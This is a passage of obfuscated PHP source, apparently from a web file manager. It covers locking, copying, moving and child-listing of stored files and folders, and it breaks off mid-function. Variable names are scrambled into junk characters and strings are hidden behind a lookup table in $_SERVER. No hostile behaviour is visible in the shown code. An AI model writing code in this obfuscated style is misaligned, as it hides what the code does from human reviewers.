$ÍÏíÛÖ[590]), $Ô÷¶Æ’Ä); $this->_lockParent($Ù±á¡ùÈ, array($ÍÏíÛÖ[589], $ÍÏíÛÖ[591]), $Ô÷¶Æ’Ä); $this->_lockEvent($Ù±á¡ùÈ, array($ÍÏíÛÖ[596], $ÍÏíÛÖ[592], $ÍÏíÛÖ[593]), $Ô÷¶Æ’Ä); } private function _lockCheck($ÙÂÕ—¶, $½ËÈæİ¡) { $’Å¬ü®İ =& $_SERVER[Î‹ÃÂŞ„]; $Ù¨Ÿ›´Ô = $this->sourceInfo($½ËÈæİ¡); $ëÁÓÖÒ = $ÙÂÕ—¶ . $’Å¬ü®İ[10] . $½ËÈæİ¡; $this->_lockTimeStart[$ëÁÓÖÒ] = timeFloat(); if (!is_array($Ù¨Ÿ›´Ô)) { return; } $Ş½»íÌ€ = LNG($’Å¬ü®İ[597]); CacheLock::setErrorMsg($’Å¬ü®İ[165] . htmlspecialchars($Ù¨Ÿ›´Ô[$’Å¬ü®İ[32]]) . $’Å¬ü®İ[167] . $Ş½»íÌ€); $this->_lockKey($ëÁÓÖÒ, 1); $this->_lockKey($ëÁÓÖÒ, 0); $˜øÀíÏ² = array_reverse($this->parentLevelArray($Ù¨Ÿ›´Ô[$’Å¬ü®İ[556]])); foreach ($˜øÀíÏ² as $–ñ‰¶¦É) { $ëÁÓÖÒ = $ÙÂÕ—¶ . $’Å¬ü®İ[598] . $–ñ‰¶¦É; if (CacheLock::lockGet($’Å¬ü®İ[599] . $ëÁÓÖÒ)) { $Ù¨Ÿ›´Ô = $this->sourceInfo($–ñ‰¶¦É); CacheLock::setErrorMsg($’Å¬ü®İ[165] . htmlspecialchars($Ù¨Ÿ›´Ô[$’Å¬ü®İ[32]]) . $’Å¬ü®İ[167] . $Ş½»íÌ€); $this->_lockKey($ëÁÓÖÒ, 1); $this->_lockKey($ëÁÓÖÒ, 0); } } } private function _lockCheckEnd($×ÛÓ¹, $´Ÿ÷…˜’) { $¶İĞãş =& $_SERVER[Î‹ÃÂŞ„]; $Ç¥ìá“· = $×ÛÓ¹ . $¶İĞãş[10] . $´Ÿ÷…˜’; CacheLock::setErrorMsg($¶İĞãş[424]); if (!isset($this->_lockTimeStart[$Ç¥ìá“·])) { return; } $ˆ–âôĞ = timeFloat() - $this->_lockTimeStart[$Ç¥ìá“·]; unset($this->_lockTimeStart[$Ç¥ìá“·]); if ($ˆ–âôĞ > 0.5) { unset(self::$cacheSourceInfo[$¶İĞãş[503] . $´Ÿ÷…˜’]); } $õßõ¯§‰ = $this->sourceInfo($´Ÿ÷…˜’); if (!$õßõ¯§‰) { show_json(LNG($¶İĞãş[107]), !1); } } private function _lockParent($ÖÖ‚œ€Ì, $¿¯«Œâˆ, $øŸğí›) { if (!$this->autoLockSet) { return; } $«’®ÙÛ† = $this->sourceInfo($ÖÖ‚œ€Ì); if (!is_array($«’®ÙÛ†)) { return; } $‡ŒÀ£¶‰ = array_reverse($this->parentLevelArray($«’®ÙÛ†[$_SERVER[Î‹ÃÂŞ„][556]])); foreach ($‡ŒÀ£¶‰ as $Æ–Ü­ì) { $this->_lockEvent($Æ–Ü­ì, $¿¯«Œâˆ, $øŸğí›); } } private function _lockEvent($æùîİÏ, $Àş‘Œƒ¤, $ÓûÇçûâ) { $§–Áû– =& $_SERVER[Î‹ÃÂŞ„]; if (!$this->autoLockSet) { return; } foreach ($Àş‘Œƒ¤ as $Úì«»¾) { $é“„•á = $Úì«»¾ . $§–Áû–[10] . $æùîİÏ; if ($ÓûÇçûâ && CacheLock::lockGet($§–Áû–[599] . $é“„•á)) { continue; } $this->_lockKey($é“„•á, $ÓûÇçûâ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ç¶¥·Í·, $‹ÁÃ¶¥÷ = 1) { $Œı³öè€ = $_SERVER[Î‹ÃÂŞ„][599] . md5($ç¶¥·Í·); if ($‹ÁÃ¶¥÷) { if (isset(self::$_lockItemArr[$Œı³öè€])) { return; } self::$_lockItemArr[$Œı³öè€] = 1; CacheLock::lock($Œı³öè€, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$Œı³öè€])) { return; } unset(self::$_lockItemArr[$Œı³öè€]); CacheLock::unlock($Œı³öè€); } } public function isParentOf($İ‘¢Š•Ë, $Š„ŸÊ‹Í) { $ùÓîÌ•á =& $_SERVER[Î‹ÃÂŞ„]; $ıı„Ó•á = $this->sourceInfo($İ‘¢Š•Ë); $ıÖšÑƒ = $this->sourceInfo($Š„ŸÊ‹Í); $ŞËì‚† = $ıı„Ó•á[$ùÓîÌ•á[556]] . $ıı„Ó•á[$ùÓîÌ•á[183]] . $ùÓîÌ•á[50]; $ÒÀò•†Ø = $ıÖšÑƒ[$ùÓîÌ•á[556]] . $ıÖšÑƒ[$ùÓîÌ•á[183]] . $ùÓîÌ•á[50]; $µøıó«ö = strpos($ÒÀò•†Ø, $ŞËì‚†) === 0; return $µøıó«ö; } private $targetIsDelete = 0; public function copy($Óàò¨Õ, $¹İĞ†¼•, $‡ºÄ×¿ = REPEAT_REPLACE, $ç£¡Ø”ı = '') { $ˆ¢ïúé =& $_SERVER[Î‹ÃÂŞ„]; $Æ¨ÒË = $this->sourceInfo($Óàò¨Õ); $ò—ş›Œß = $this->sourceInfo($¹İĞ†¼•); if (!$Æ¨ÒË || !$ò—ş›Œß || $ò—ş›Œß[$ˆ¢ïúé[455]] != $ˆ¢ïúé[90]) { return !1; } if ($this->isParentOf($Óàò¨Õ, $¹İĞ†¼•)) { return !1; } $´ÏıÜ¤› = $ç£¡Ø”ı ? $ç£¡Ø”ı : $Æ¨ÒË[$ˆ¢ïúé[32]]; $this->lockCopyStart($Óàò¨Õ); $this->lockWriteStart($¹İĞ†¼•, $´ÏıÜ¤›); $ÇæÒ¨÷ = array($ˆ¢ïúé[600] => array(), $ˆ¢ïúé[601] => array(), $ˆ¢ïúé[602] => array()); $this->targetIsDelete = intval($Æ¨ÒË[$ˆ¢ïúé[475]]); $ûú¡µÂ = $this->fileNameExistAuto($¹İĞ†¼•, $Æ¨ÒË); $ïç…èÈ = $this->_copy($Óàò¨Õ, $¹İĞ†¼•, $‡ºÄ×¿, $ÇæÒ¨÷, !0, $ç£¡Ø”ı); $this->_childrenListClear(); $this->lockCopyEnd($Óàò¨Õ); $this->lockWriteEnd($¹İĞ†¼•, $´ÏıÜ¤›); if ($Æ¨ÒË[$ˆ¢ïúé[455]] == $ˆ¢ïúé[90] && $ûú¡µÂ == $ïç…èÈ) { $this->folderSizeResetChildren($ûú¡µÂ); } Model($ˆ¢ïúé[603])->addAll($ÇæÒ¨÷[$ˆ¢ïúé[601]], array(), !0); if ($ûú¡µÂ != $ïç…èÈ || $Æ¨ÒË[$ˆ¢ïúé[455]] == $ˆ¢ïúé[90]) { Model($ˆ¢ïúé[604])->eventCopy($ïç…èÈ); } $this->saveAll($ÇæÒ¨÷[$ˆ¢ïúé[602]]); Model($ˆ¢ïúé[216])->linkAdd($ÇæÒ¨÷[$ˆ¢ïúé[600]]); $this->folderSizeReset($¹İĞ†¼•); $this->updateModifyTime($¹İĞ†¼•); return $ïç…èÈ; } private function _copy($©Í¬¾Å, $äÛ®, $ºÒÕõÏ¯, &$ÊµñáÔÖ, $÷áÍúÖé, $„õÃ—º– = '') { $Ù³…âÅá =& $_SERVER[Î‹ÃÂŞ„]; $Ñ½µßìã = $this->sourceInfoCache($©Í¬¾Å); $¤½Ê×äÏ = $Ñ½µßìã[$Ù³…âÅá[455]] == $Ù³…âÅá[90]; $¾ãŸî“‹ = $„õÃ—º– ? $„õÃ—º– : $Ñ½µßìã[$Ù³…âÅá[32]]; $áïÙ¬ù = $this->fileNameExistAuto($äÛ®, $Ñ½µßìã); if ($÷áÍúÖé) { $this->_childrenAllMake($©Í¬¾Å); if ($¤½Ê×äÏ && $áïÙ¬ù) { $this->_childrenAllMake($áïÙ¬ù); } } if (!$áïÙ¬ù) { return $this->_copyCreate($©Í¬¾Å, $äÛ®, $¾ãŸî“‹, $ÊµñáÔÖ); } $ËÑ¡ş© = $áïÙ¬ù; if ($¤½Ê×äÏ) { if ($ºÒÕõÏ¯ == REPEAT_RENAME_FOLDER) { $¾ãŸî“‹ = $this->fileNameAutoCache($äÛ®, $¾ãŸî“‹, $ºÒÕõÏ¯, $¤½Ê×äÏ); $ËÑ¡ş© = $this->_copyCreate($©Í¬¾Å, $äÛ®, $¾ãŸî“‹, $ÊµñáÔÖ); } else { $ÄÒŒ¯² = $this->_childrenList($©Í¬¾Å); foreach ($ÄÒŒ¯² as $şâãœù) { $this->_copy($şâãœù[$Ù³…âÅá[183]], $áïÙ¬ù, $ºÒÕõÏ¯, $ÊµñáÔÖ, !1); } } } else { if ($ºÒÕõÏ¯ == REPEAT_RENAME || $ºÒÕõÏ¯ == REPEAT_RENAME_FOLDER) { $¾ãŸî“‹ = $this->fileNameAutoCache($äÛ®, $¾ãŸî“‹, $ºÒÕõÏ¯, $¤½Ê×äÏ); $ËÑ¡ş© = $this->_copyCreate($©Í¬¾Å, $äÛ®, $¾ãŸî“‹, $ÊµñáÔÖ); } else { if ($ºÒÕõÏ¯ == REPEAT_REPLACE) { $§ØóşÚ = $this->sourceInfoCache($áïÙ¬ù); $äíˆ³ç± = $this->fileHistory($§ØóşÚ, $Ñ½µßìã[$Ù³…âÅá[511]], $Ñ½µßìã[$Ù³…âÅá[78]]); if ($äíˆ³ç±) { $ÊµñáÔÖ[$Ù³…âÅá[600]][] = $Ñ½µßìã[$Ù³…âÅá[511]]; } } else { if ($ºÒÕõÏ¯ == REPEAT_SKIP) { } } } Hook::trigger($Ù³…âÅá[605], array($Ù³…âÅá[606], $Ñ½µßìã, 0)); } return $ËÑ¡ş©; } private function _copyCreate($ö–Â±ê, $¨¦ë¡™, $ââœñØÅ, &$’Äí©Àµ) { $Ö§¨èËÀ =& $_SERVER[Î‹ÃÂŞ„]; $í‘ÔèÙˆ = $this->sourceInfoCache($ö–Â±ê); $í‚¾Ïæ = $this->sourceInfoCache($¨¦ë¡™); $šÓ”ÏÍ˜ = $this->_makeItemData($í‘ÔèÙˆ, $í‚¾Ïæ, $ââœñØÅ); Hook::trigger($Ö§¨èËÀ[607], $šÓ”ÏÍ˜); Hook::trigger($Ö§¨èËÀ[608], array($Ö§¨èËÀ[609], $šÓ”ÏÍ˜, 0)); $Èãá¶µ§ = $this->add($šÓ”ÏÍ˜); $¢®ø®ê = array($Ö§¨èËÀ[183] => $Èãá¶µ§, $Ö§¨èËÀ[32] => $ââœñØÅ); $this->_copyApplyMeta($¢®ø®ê, $’Äí©Àµ); if ($í‘ÔèÙˆ[$Ö§¨èËÀ[455]] != $Ö§¨èËÀ[90]) { $’Äí©Àµ[$Ö§¨èËÀ[600]][] = $í‘ÔèÙˆ[$Ö§¨èËÀ[511]]; return $Èãá¶µ§; } $½¿¯°èÅ = array(); $·®ç†ğ‹ = array(); $this->_childrenListAll($ö–Â±ê, $½¿¯°èÅ); $Ñ€ı¡Ô£ = count($½¿¯°èÅ); if ($Ñ€ı¡Ô£ == 0) { return $Èãá¶µ§; } $ü¤ÜŸÔ = $this->sourceInfo($Èãá¶µ§); foreach ($½¿¯°èÅ as $Å¿ƒ–Ëô) { $áü¥çÅë = $this->_makeItemData($Å¿ƒ–Ëô, $ü¤ÜŸÔ, $Å¿ƒ–Ëô[$Ö§¨èËÀ[32]]); $áü¥çÅë[$Ö§¨èËÀ[556]] = $Å¿ƒ–Ëô[$Ö§¨èËÀ[556]]; $·®ç†ğ‹[] = $áü¥çÅë; } $this->chunkEventSet($Ö§¨èËÀ[610], array($Ö§¨èËÀ[611], $šÓ”ÏÍ˜, $Ñ€ı¡Ô£)); $this->addAll($·®ç†ğ‹, array(), !1); $ë¾ã§• = $this->where(array($Ö§¨èËÀ[182] => $Èãá¶µ§))->select(); $¾Ç¤ğôò = $this->_childrenMakeRelation($½¿¯°èÅ, $ë¾ã§•); $¾Ç¤ğôò[$ö–Â±ê] = $Èãá¶µ§; $úİ ûÛ² = array(); $£ÇâÎßı = array(); foreach ($ë¾ã§• as $Å¿ƒ–Ëô) { $É’ÍÂï— = $Å¿ƒ–Ëô[$Ö§¨èËÀ[183]]; $ÌàûâŞæ = $this->_childrenMatch($¾Ç¤ğôò, $Å¿ƒ–Ëô, $ü¤ÜŸÔ); $úİ ûÛ²[] = array($Ö§¨èËÀ[183], $É’ÍÂï—, $Ö§¨èËÀ[182], $ÌàûâŞæ[$Ö§¨èËÀ[182]]); $£ÇâÎßı[] = array($Ö§¨èËÀ[183], $É’ÍÂï—, $Ö§¨èËÀ[556], $ÌàûâŞæ[$Ö§¨èËÀ[556]]); $this->_copyApplyMeta($Å¿ƒ–Ëô, $’Äí©Àµ); if ($Å¿ƒ–Ëô[$Ö§¨èËÀ[455]] != $Ö§¨èËÀ[90]) { $’Äí©Àµ[$Ö§¨èËÀ[600]][] = $Å¿ƒ–Ëô[$Ö§¨èËÀ[511]]; } } $this->chunkEventSet($Ö§¨èËÀ[612], array($Ö§¨èËÀ[613], $šÓ”ÏÍ˜, $Ñ€ı¡Ô£)); $this->saveAll($úİ ûÛ²); $this->chunkEventSet($Ö§¨èËÀ[614], array($Ö§¨èËÀ[615], $šÓ”ÏÍ˜, $Ñ€ı¡Ô£)); $this->saveAll($£ÇâÎßı); return $Èãá¶µ§; } private function _childrenMakeRelation($¡Š‹Éæî, $Í‘şê) { $Ì´ìáÕ‡ =& $_SERVER[Î‹ÃÂŞ„]; $Ğ»‚²¹ = array(); $Ğ¢ßü  = array(); foreach ($¡Š‹Éæî as $¯ñ€ˆ€ƒ) { $â·¹ ïù = $¯ñ€ˆ€ƒ[$Ì´ìáÕ‡[32]] . $Ì´ìáÕ‡[8] . $¯ñ€ˆ€ƒ[$Ì´ìáÕ‡[556]]; $Ğ»‚²¹[$â·¹ ïù] = $¯ñ€ˆ€ƒ[$Ì´ìáÕ‡[183]]; } foreach ($Í‘şê as $¯ñ€ˆ€ƒ) { $â·¹ ïù = $¯ñ€ˆ€ƒ[$Ì´ìáÕ‡[32]] . $Ì´ìáÕ‡[8] . $¯ñ€ˆ€ƒ[$Ì´ìáÕ‡[556]]; $Ä…¶Ã¦¸ = $Ğ»‚²¹[$â·¹ ïù]; $Ğ¢ßü [$Ä…¶Ã¦¸] = $¯ñ€ˆ€ƒ[$Ì´ìáÕ‡[183]]; } return $Ğ¢ßü ; } private function _childrenMatch($ò¿œÇœ, $åúÇ²€, $ò£÷Øã) { $÷Û¡‘£· =& $_SERVER[Î‹ÃÂŞ„]; $ÅÖÊæ£ = $ò£÷Øã[$÷Û¡‘£·[556]]; $Ò°¨¸Íî = $this->parentLevelArray($åúÇ²€[$÷Û¡‘£·[556]]); foreach ($Ò°¨¸Íî as $•ìŠ³œ) { if (isset($ò¿œÇœ[$•ìŠ³œ])) { $ÅÖÊæ£ .= $ò¿œÇœ[$•ìŠ³œ] . $÷Û¡‘£·[616]; } } $ÅÖÊæ£ = rtrim($ÅÖÊæ£, $÷Û¡‘£·[50]) . $÷Û¡‘£·[50]; $Õõ†ã¢ = $this->parentLevelArray($ÅÖÊæ£); $¸èªØ½² = $Õõ†ã¢[count($Õõ†ã¢) - 1]; return array($÷Û¡‘£·[182] => $¸èªØ½², $÷Û¡‘£·[556] => $ÅÖÊæ£); } private function _makeItemData($çöÍÖí, $©‚Ô¯÷, $‰§™ÈÍ³) { $Ğ¶­“¡€ =& $_SERVER[Î‹ÃÂŞ„]; $Éâì³ = array($Ğ¶­“¡€[617] => $çöÍÖí[$Ğ¶­“¡€[455]], $Ğ¶­“¡€[464] => $‰§™ÈÍ³, $Ğ¶­“¡€[618] => $çöÍÖí[$Ğ¶­“¡€[456]] ? $çöÍÖí[$Ğ¶­“¡€[456]] : $Ğ¶­“¡€[12], $Ğ¶­“¡€[512] => $çöÍÖí[$Ğ¶­“¡€[511]] ? $çöÍÖí[$Ğ¶­“¡€[511]] : 0, $Ğ¶­“¡€[588] => $çöÍÖí[$Ğ¶­“¡€[78]] ? $çöÍÖí[$Ğ¶­“¡€[78]] : 0, $Ğ¶­“¡€[619] => intval($©‚Ô¯÷[$Ğ¶­“¡€[180]]), $Ğ¶­“¡€[620] => intval($©‚Ô¯÷[$Ğ¶­“¡€[541]]), $Ğ¶­“¡€[621] => intval(USER_ID), $Ğ¶­“¡€[622] => intval(USER_ID), $Ğ¶­“¡€[447] => intval($©‚Ô¯÷[$Ğ¶­“¡€[183]]), $Ğ¶­“¡€[623] => $©‚Ô¯÷[$Ğ¶­“¡€[556]] . $©‚Ô¯÷[$Ğ¶­“¡€[183]] . $Ğ¶­“¡€[50], $Ğ¶­“¡€[468] => $çöÍÖí[$Ğ¶­“¡€[87]] ? $çöÍÖí[$Ğ¶­“¡€[87]] : time(), $Ğ¶­“¡€[474] => 0, $Ğ¶­“¡€[624] => $Ğ¶­“¡€[12]); return $Éâì³; } private function _copyApplyMeta($Ì•ïãÖÙ, &$áßıøèÜ) { $óÌŒ²©Õ =& $_SERVER[Î‹ÃÂŞ„]; $ªó’¡Ú‚ = $Ì•ïãÖÙ[$óÌŒ²©Õ[183]]; $ÙŒÅâ­Ö = $Ì•ïãÖÙ[$óÌŒ²©Õ[32]]; if (!isset($Ì•ïãÖÙ[$óÌŒ²©Õ[625]]) || !$Ì•ïãÖÙ[$óÌŒ²©Õ[625]] || $Ì•ïãÖÙ[$óÌŒ²©Õ[625]] == $óÌŒ²©Õ[214]) { $áßıøèÜ[$óÌŒ²©Õ[602]][] = array($óÌŒ²©Õ[183], $ªó’¡Ú‚, $óÌŒ²©Õ[625], short_id($ªó’¡Ú‚)); } if (Input::check($ÙŒÅâ­Ö, $óÌŒ²©Õ[626])) { $áßıøèÜ[$óÌŒ²©Õ[601]][] = array($óÌŒ²©Õ[183] => $ªó’¡Ú‚, $óÌŒ²©Õ[96] => $óÌŒ²©Õ[508], $óÌŒ²©Õ[420] => str_replace($óÌŒ²©Õ[53], $óÌŒ²©Õ[12], Pinyin::get($ÙŒÅâ­Ö))); $áßıøèÜ[$óÌŒ²©Õ[601]][] = array($óÌŒ²©Õ[183] => $ªó’¡Ú‚, $óÌŒ²©Õ[96] => $óÌŒ²©Õ[507], $óÌŒ²©Õ[420] => Pinyin::get($ÙŒÅâ­Ö, $óÌŒ²©Õ[627])); } $áßıøèÜ[$óÌŒ²©Õ[601]][] = array($óÌŒ²©Õ[183] => $ªó’¡Ú‚, $óÌŒ²©Õ[96] => $óÌŒ²©Õ[487], $óÌŒ²©Õ[420] => KodSort::makeStr($ÙŒÅâ­Ö)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($í±Åù†Ğ) { $õã•ì‘‘ =& $_SERVER[Î‹ÃÂŞ„]; $Ç Õ£î¥ = $this->sourceInfo($í±Åù†Ğ); $èù©ûé = $õã•ì‘‘[628]; $†åËá¥³ = array($õã•ì‘‘[556] => array($õã•ì‘‘[583], $Ç Õ£î¥[$õã•ì‘‘[556]] . $í±Åù†Ğ . $õã•ì‘‘[584]), $õã•ì‘‘[475] => $this->targetIsDelete); $ß‰İº–ñ = $this->field($èù©ûé)->where($†åËá¥³)->select(); if (!$ß‰İº–ñ) { return; } $ß‰İº–ñ = array_to_keyvalue($ß‰İº–ñ, $õã•ì‘‘[183]); foreach ($ß‰İº–ñ as $ØÅ¢ºÆ) { $¤ØÌİ¹Š = $ØÅ¢ºÆ[$õã•ì‘‘[182]]; $í±Åù†Ğ = $ØÅ¢ºÆ[$õã•ì‘‘[183]]; if (!isset($this->_childrenListCache[$í±Åù†Ğ]) && $ØÅ¢ºÆ[$õã•ì‘‘[455]] == $õã•ì‘‘[90]) { $this->_childrenListCache[$í±Åù†Ğ] = array(); } if (!isset($this->_childrenListCache[$¤ØÌİ¹Š])) { $this->_childrenListCache[$¤ØÌİ¹Š] = array(); } $this->_childrenListCache[$¤ØÌİ¹Š][$í±Åù†Ğ] = $ØÅ¢ºÆ; $this->_childrenItemCache[$í±Åù†Ğ] = $ØÅ¢ºÆ; } } private function _childrenListAll($ëÇñ¿’ï, &$Ë•èÁş‘) { $‚ĞµŞµÚ =& $_SERVER[Î‹ÃÂŞ„]; if (!isset($this->_childrenListCache[$ëÇñ¿’ï])) { return; } $øë•“•İ = $this->_childrenListCache[$ëÇñ¿’ï]; foreach ($øë•“•İ as $Œª¨Êéî => $Û™À±Á°) { $Ë•èÁş‘[$Œª¨Êéî] = $Û™À±Á°; if ($Û™À±Á°[$‚ĞµŞµÚ[455]] == $‚ĞµŞµÚ[90]) { $this->_childrenListAll($Œª¨Êéî, $Ë•èÁş‘); } } } private function sourceInfoCache($Ò³Áö†Ÿ) { if (isset($this->_childrenItemCache[$Ò³Áö†Ÿ])) { return $this->_childrenItemCache[$Ò³Áö†Ÿ]; } return $this->sourceInfo($Ò³Áö†Ÿ); } private function _childrenList($¾Š«ÓÙ×) { if (isset($this->_childrenListCache[$¾Š«ÓÙ×])) { return $this->_childrenListCache[$¾Š«ÓÙ×]; } return $this->_childrenListSelect($¾Š«ÓÙ×); } private function _childrenListSelect($«§Ä²éã) { $Ëñ†ŠŠ§ =& $_SERVER[Î‹ÃÂŞ„]; $ø­•Óïì = array($Ëñ†ŠŠ§[182] => $«§Ä²éã, $Ëñ†ŠŠ§[475] => $this->targetIsDelete); $›û’ùş = $this->where($ø­•Óïì)->select(); $›û’ùş = $›û’ùş ? $›û’ùş : array(); $‡â€¡ßÆ = array_to_keyvalue($›û’ùş, $Ëñ†ŠŠ§[183]); $this->_childrenListCache[$«§Ä²éã] = $‡â€¡ßÆ; foreach ($‡â€¡ßÆ as $«§Ä²éã => $ÅÁ ¬‚) { $this->_childrenItemCache[$«§Ä²éã] = $ÅÁ ¬‚; } return $‡â€¡ßÆ; } private function fileNameExistAuto($ãÄ©›², $‰ÇĞÁŞà) { $‡¢ƒ¨»“ =& $_SERVER[Î‹ÃÂŞ„]; if ($‰ÇĞÁŞà[$‡¢ƒ¨»“[475]] == $‡¢ƒ¨»“[90]) { return $this->fileNameExist($ãÄ©›², $‰ÇĞÁŞà[$‡¢ƒ¨»“[32]]); } return $this->fileNameExistCache($ãÄ©›², $‰ÇĞÁŞà[$‡¢ƒ¨»“[32]]); } private function fileNameExistCache($ ğĞê¥ù, $Ş‘äúÛ) { $÷Ôİ´Öë =& $_SERVER[Î‹ÃÂŞ„]; $Ş‘äúÛ = strtolower($Ş‘äúÛ); $…òùô§ = $this->_childrenList($ ğĞê¥ù); foreach ($…òùô§ as $ïÌÑÎçË) { if ($Ş‘äúÛ == strtolower($ïÌÑÎçË[$÷Ôİ´Öë[32]])) { return $ïÌÑÎçË[$÷Ôİ´Öë[183]]; } } return !1; } private function fileNameAutoCache($±şàÂÔ‘, $áš·ùÔ®, $ş«ÂÆ¯•, $¼êğœ“±) { $±õ­±È  =& $_SERVER[Î‹ÃÂŞ„]; $éŒÇ’« = $this->_childrenList($±şàÂÔ‘); $Æé³ÒÉ = array_to_keyvalue($éŒÇ’«, $±õ­±È [12], $±õ­±È [32]); return $this->fileNameAutoGet($Æé³ÒÉ, $áš·ùÔ®, $ş«ÂÆ¯•, $¼êğœ“±); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($£«¢« , $Îµç¬ìè, $ş¡´‹‚Î = REPEAT_REPLACE, $°­ŸÂÌÈ = '') { $¿‘¼»ŠÖ =& $_SERVER[Î‹ÃÂŞ„]; $ş§Å‚™‰ = $this->sourceInfo($£«¢« ); $óëùîúØ = $this->sourceInfo($Îµç¬ìè); if ($ş§Å‚™‰[$¿‘¼»ŠÖ[182]] == $óëùîúØ[$¿‘¼»ŠÖ[183]]) { if ($ş§Å‚™‰[$¿‘¼»ŠÖ[475]] == $¿‘¼»ŠÖ[90]) { Model($¿‘¼»ŠÖ[473])->restore(array($£«¢« )); } if (!$°­ŸÂÌÈ || $°­ŸÂÌÈ == $ş§Å‚™‰[$¿‘¼»ŠÖ[32]]) { return $£«¢« ; } } $·ÆÏõ‚ = $this->pathInfoMore($£«¢« ); if ($this->isParentOf($£«¢« , $Îµç¬ìè)) { return !1; } if (!$ş§Å‚™‰ || !$óëùîúØ || $óëùîúØ[$¿‘¼»ŠÖ[455]] != $¿‘¼»ŠÖ[90]) { return !1; } Hook::trigger($¿‘¼»ŠÖ[629], $·ÆÏõ‚); $this->targetIsDelete = intval($ş§Å‚™‰[$¿‘¼»ŠÖ[475]]); if ($ş§Å‚™‰[$¿‘¼»ŠÖ[182]] == $Îµç¬ìè && $°­ŸÂÌÈ != $ş§Å‚™‰[$¿‘¼»ŠÖ[32]]) { $Êœ›ûÛ = $this->fileNameExist($Îµç¬ìè, $°­ŸÂÌÈ); if ($Êœ›ûÛ && $ş§Å‚™‰[$¿‘¼»ŠÖ[455]] == $¿‘¼»ŠÖ[214]) { $°©ÛşŠ¡ = $this->sourceInfo($Êœ›ûÛ); $öË£á¤‰ = $this->fileHistory($°©ÛşŠ¡, $ş§Å‚™‰[$¿‘¼»ŠÖ[511]], $ş§Å‚™‰[$¿‘¼»ŠÖ[78]]); if (!$öË£á¤‰) { Model($¿‘¼»ŠÖ[514])->remove($ş§Å‚™‰[$¿‘¼»ŠÖ[511]]); } $this->removeNow($£«¢« , !1); $this->folderSizeReset($Îµç¬ìè); Hook::trigger($¿‘¼»ŠÖ[630], $·ÆÏõ‚); return $Êœ›ûÛ; } } $¨ˆşúÂû = $°­ŸÂÌÈ ? $°­ŸÂÌÈ : $ş§Å‚™‰[$¿‘¼»ŠÖ[32]]; $this->lockMoveStart($£«¢« ); $this->lockWriteStart($Îµç¬ìè, $¨ˆşúÂû); $Ó´óƒÓ = array($¿‘¼»ŠÖ[600] => array(), $¿‘¼»ŠÖ[631] => !1); $this->clearShare($£«¢« , $Îµç¬ìè); $“¸‚£¥Ö = $this->fileNameExistAuto($Îµç¬ìè, $ş§Å‚™‰); $Ü—ø£¦È = $this->_move($£«¢« , $Îµç¬ìè, $ş¡´‹‚Î, $Ó´óƒÓ, $°­ŸÂÌÈ); $this->sourceCacheClear(); if ($ş§Å‚™‰[$¿‘¼»ŠÖ[455]] == $¿‘¼»ŠÖ[90] && $“¸‚£¥Ö) { $this->folderSizeResetChildren($Ü—ø£¦È); } Model($¿‘¼»ŠÖ[216])->linkAdd($Ó´óƒÓ[$¿‘¼»ŠÖ[600]]); if ($“¸‚£¥Ö && $Ó´óƒÓ[$¿‘¼»ŠÖ[631]]) { $this->removeNow($£«¢« , !1); } $this->lockMoveEnd($£«¢« ); $this->lockWriteEnd($Îµç¬ìè, $¨ˆşúÂû); $this->folderSizeReset($ş§Å‚™‰[$¿‘¼»ŠÖ[182]]); $this->folderSizeReset($Îµç¬ìè); $Šç÷Œ÷ = array($ş§Å‚™‰[$¿‘¼»ŠÖ[182]], $Îµç¬ìè); if ($ş§Å‚™‰[$¿‘¼»ŠÖ[455]] == $¿‘¼»ŠÖ[90]) { $Šç÷Œ÷[] = $£«¢« ; } $this->updateModifyTime($Šç÷Œ÷); Model($¿‘¼»ŠÖ[604])->eventMove($£«¢« , $ş§Å‚™‰[$¿‘¼»ŠÖ[182]], $Îµç¬ìè); Hook::trigger($¿‘¼»ŠÖ[630], $·ÆÏõ‚); return $Ü—ø£¦È; } private function _move($µòÒ†Î™, $şœË·, $³Î‚Î¶Û, &$äß’ıà, $Í“¹—şş = '') { $Ü¸¢û¶ =& $_SERVER[Î‹ÃÂŞ„]; $ôõŸˆ = $this->sourceInfo($µòÒ†Î™); $ˆš®›÷ = $ôõŸˆ[$Ü¸¢û¶[455]] == $Ü¸¢û¶[90]; $†§æ©— = $Í“¹—şş ? $Í“¹—şş : $ôõŸˆ[$Ü¸¢û¶[32]]; $Øò’”ï = $this->fileNameExistAuto($şœË·, $ôõŸˆ); $this->lockMoveStart($µòÒ†Î™); $this->lockWriteStart($şœË·, $†§æ©—); if (!$Øò’”ï) { return $this->_moveForce($µòÒ†Î™, $şœË·, $†§æ©—); } $«¾§¡§Ó = $Øò’”ï; $ãîÒÕçÇ = !1; if ($ˆš®›÷) { if ($³Î‚Î¶Û == REPEAT_RENAME_FOLDER) { $†§æ©— = $this->fileNameAuto($şœË·, $†§æ©—, $³Î‚Î¶Û, $ˆš®›÷); $«¾§¡§Ó = $this->_moveForce($µòÒ†Î™, $şœË·, $†§æ©—); } else { if ($³Î‚Î¶Û == REPEAT_RENAME_FOLDER) { $³Î‚Î¶Û = REPEAT_RENAME; } $ßÊéÖÖ— = $this->_childrenListSelect($µòÒ†Î™); foreach ($ßÊéÖÖ— as $ÚŞ‹ÑÊ¿) { $this->_move($ÚŞ‹ÑÊ¿[$Ü¸¢û¶[183]], $Øò’”ï, $³Î‚Î¶Û, $äß’ıà); } $ãîÒÕçÇ = !0; } } else { if ($³Î‚Î¶Û == REPEAT_SKIP) { $ãîÒÕçÇ = !0; } else { if ($³Î‚Î¶Û == REPEAT_RENAME || $³Î‚Î¶Û == REPEAT_RENAME_FOLDER) { $†§æ©— = $this->fileNameAuto($şœË·, $†§æ©—, $³Î‚Î¶Û, $ˆš®›÷); $«¾§¡§Ó = $this->_moveForce($µòÒ†Î™, $şœË·, $†§æ©—); } else { if ($³Î‚Î¶Û == REPEAT_REPLACE) { $ÏÈ–Š® = $this->sourceInfoCache($Øò’”ï); $ºç×Âê‹ = $this->fileHistory($ÏÈ–Š®, $ôõŸˆ[$Ü¸¢û¶[511]], $ôõŸˆ[$Ü¸¢û¶[78]]); $ãîÒÕçÇ = !0; if ($ºç×Âê‹) { $äß’ıà[$Ü¸¢û¶[600]][] = $ôõŸˆ[$Ü¸¢û¶[511]]; } } } } } if 